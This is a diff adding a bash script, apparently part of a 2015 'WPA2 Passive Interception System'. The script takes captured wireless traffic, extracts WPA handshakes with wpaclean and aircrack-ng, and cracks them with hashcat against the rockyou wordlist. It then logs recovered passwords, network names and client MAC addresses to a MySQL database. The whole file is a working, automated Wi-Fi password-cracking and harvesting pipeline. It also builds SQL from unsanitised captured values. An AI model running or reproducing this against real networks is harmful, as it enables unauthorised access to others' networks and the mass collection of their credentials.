@@ -1,0 +1,112 @@
+#!/bin/bash
+# Project: WPA2 Passive Interception System [2.4Ghz]
+# Title: WPA Inspect and Post Script
+# Author: the.joe.mit@gmail.com (0x766663B1)
+# Date: Jan 16th, 2015
+# Version: 0.5 ALPHA
+# Notes:
+# Lists the dirs made by srv_pullxtrtar into an array
+# Lists the caps in those dirs into an array
+# Each cap is wpacleaned, parsing to file the first EAPOL it finds
+# Upon incountering a EAPOL in a cap, it passed the parsed EAPOL to hashcat.
+# Upon recovery, or exhusting the wordlist the results are posted to mysql database.
+# The script will clean all caps found extracted by srv_pullxtrtar
+# No sanitization function yet.
+# Intending to offload the crack job, this becoming a controller FSM.
+#
+# This work is licensed under a
+# Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License.
+#
+# SUPER USER CHECKER
+# Is used to check if the script is run by the root user.
+# Only executed once when the script is called; an init state function.
+#
+SUChk() {
+        if [ $(id -u) != "0" ]; then
+                echo "You must be the superuser to run this script" >&2
+                exit 1
+        fi
+}
+getDirList() {
+	echo "[dirlist start]	Listing Directories"
+	capcnt=0
+	while [ $(ls -lah log/ | egrep '[1-9][1-9][1-9][1-9][1-9]' | wc -l) -gt $capcnt ]; do
+		dirs[$capcnt]="$(ls -lah log/ | egrep '[1-9][1-9][1-9][1-9][1-9]' | awk -v lst="$capcnt" 'NR>lst' | head -n1 | awk '/channel/ {print $9; exit;}')"
+		echo "[dirlist][$capcnt]	${dirs[${capcnt}]}"
+		((capcnt++))
+	done
+        echo "[dirlist done]	Done Listing"
+}
+getCapList() {
+        echo "[caplist start]	Listing Captures"
+        roll=0
+        while [ $(ls -lah log/ | egrep '[1-9][1-9][1-9][1-9][1-9]' | wc -l) -gt $roll ]; do
+  		dirt="log/${dirs[${roll}]}"
+		cap="$(ls -lah $dirt | awk '/cap/ {print $9; exit;}')"
+                caps[$roll]="${dirt}/${cap}"
+		echo "[caplist][$roll]	${caps[${roll}]}"
+                ((roll++))
+        done
+        echo "[caplist done]	Done Listing Captures"
+}
+cleanCap() {
+        echo "[cleanlist start]	Cleaning All Captures"
+        roll=0
+        while [ $(ls -lah log/ | egrep '[1-9][1-9][1-9][1-9][1-9]' | wc -l) -gt $roll ]; do
+		url="${caps[${roll}]}"
+		capname="${dirs[${roll}]}"
+		wpaclean $capname.cap $url > wpaclean.log
+		if [ $(cat wpaclean.log | wc -l) -gt 2 ]; then
+			echo "[cleanlist][$roll]	FOUND EAPOL $capname"
+			crackEAPOL
+			postInfo
+		else
+			echo "[cleanlist][$roll]	CLEAN $capname"
+		fi
+		((roll++))
+        done
+        echo "[cleanlist done]	All Captures Clean"
+}
+crackEAPOL() {
+	echo "[crackcap start]	${dirs[${roll}]}"
+	aircrack-ng $capname.cap -J $capname > $capname.log
+	cd $hashcatdir
+	./hashcat-cli64.bin -m 2500 $homedir/$capname.hccap $wordlist >> $homedir/$capname.log
+	cd $homedir
+}
+postInfo() {
+	echo "[post start] Posting crack info..."
+	if [ $(cat $capname.log | grep 'recovered' | wc -l) -gt 0 ]; then
+		password="$(cat $capname.log | grep '.hccap:' | tail -n1 | cut -d: -f2)"
+		echo "[post]	RECOVERED $password"
+	else
+		password="[post]	NOT RECOVERED"
+	fi
+	capstart="$(echo $capname | cut -d_ -f2)"
+	capstop="$(echo $capname | cut -d_ -f1)"
+	channel="$(echo $capname | cut -d_ -f4)"
+	essid="$(cat $capname.log | grep '(length:' | cut -d' ' -f5)"
+	bssid="$(cat $capname.log | grep 'BSSID:' | cut -d' ' -f3)"
+	station="$(cat $capname.log | grep 'STA:' | cut -d' ' -f3)"
+	speed="$(cat $capname.log | grep 'Speed' | cut -d' ' -f4)"
+	crackprogress="$(cat $capname.log | grep 'Progress' | cut -d' ' -f2)"
+	crackstart="$(cat $capname.log | grep 'Started' | cut -d' ' -f2-6)"
+	crackstop="$(cat $capname.log | grep 'Stopped' | cut -d' ' -f2-6)"
+	insertval="'$capstart','$capstop','$channel','$essid','$bssid','$station','$speed','$crackprogress','$password','$crackstart','$crackstop'"
+	insertstm="insert into $table (CaptureStarted,CaptureStopped,Channel,ESSID,BSSID,Station,WordPerSec,WordProgress,Password,CrackStarted,CrackStopped) values(${insertval});" 
+	echo "${insertstm}" > $capname".sql"
+	mysql --user=$dbusr --password=$dbpass --host=$dbs -D $dbname < $capname".sql"
+	echo "[post done] Done Cracking"
+}
+hashcatdir="/home/username/hashcat-2.00"
+wordlist="/home/username/wordlist/rockyou.txt"
+homedir="/home/username"
+dbs="192.168.1.1"
+dbusr="dbusername"
+dbpass="dbpassword"
+dbname="dbname"
+table="tablename"
+SUChk
+getDirList
+getCapList
+cleanCap
